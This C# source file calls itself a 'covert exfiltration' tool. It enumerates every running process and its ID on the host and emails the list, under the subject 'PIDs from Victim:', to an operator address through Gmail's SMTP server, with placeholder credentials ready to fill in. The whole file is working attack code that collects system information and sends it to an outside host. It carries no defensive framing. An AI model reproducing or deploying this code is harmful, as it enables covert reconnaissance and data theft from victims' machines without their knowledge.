/*
Covert exfiltration via usage of SMTP protocol and port
*/
using System;
using System.Net;           // For NetworkCredentials
using System.Net.Mail;      // For mail operation
using System.Text;          // For string operation
using System.Diagnostics;   // For process operation

namespace Gmail
{
    class Program
    {  
        static string smtpAddress = "smtp.gmail.com";  
        static int portNumber = 587;  
        static bool enableSSL = true;

        static string emailFromAddress = "sender@gmail.com"; //Change to Sender Email Address  
        static string password = "senderpassword";           //Change to Sender Password  
        static string emailToAddress = "Operator@gmail.com"; //Change to Receiver Email Address

        static string subject = "PIDs from Victim:";  
        
        public static void SendEmail(string procinfo)
        {  
            using(MailMessage mail = new MailMessage())
            {  
                mail.From = new MailAddress(emailFromAddress);  
                mail.To.Add(emailToAddress);  
                mail.Subject = subject;  
                mail.Body = procinfo;  
                mail.IsBodyHtml = true;  
                
                using(SmtpClient smtp = new SmtpClient(smtpAddress, portNumber))
                {  
                    smtp.Credentials = new NetworkCredential(emailFromAddress, password);  
                    smtp.EnableSsl = enableSSL;  
                    smtp.Send(mail);  
                }  
            }  
        }

        // Processname and pid
        public static string ProcessInfo()
        {
            Process[] processlist = Process.GetProcesses();
            string processes = "";
            for(int i = 0; i < processlist.Length; i++)
            {
                int j = i+1;
                processes += "("+j.ToString()+". "+processlist[i].ProcessName+" : "+processlist[i].Id+") | ";
            }
            return processes;
        }

        static void Main(string[] args)
        {
            string procinfo = ProcessInfo();
            SendEmail(procinfo);
        }    
    }
}
